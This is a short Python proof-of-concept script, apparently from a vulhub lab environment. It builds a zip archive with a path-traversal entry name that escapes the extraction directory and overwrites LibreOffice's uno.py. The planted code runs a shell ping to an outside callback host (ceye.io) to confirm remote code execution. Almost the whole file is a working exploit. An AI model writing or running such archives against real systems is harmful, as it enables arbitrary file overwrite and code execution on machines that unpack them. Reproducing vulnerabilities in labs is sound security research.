import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'vulhub'
        binary2 = b"import os\nos.system('ping -c 4 6qmv2c.ceye.io')\n"
        zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
        # info = zipfile.ZipInfo("test.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e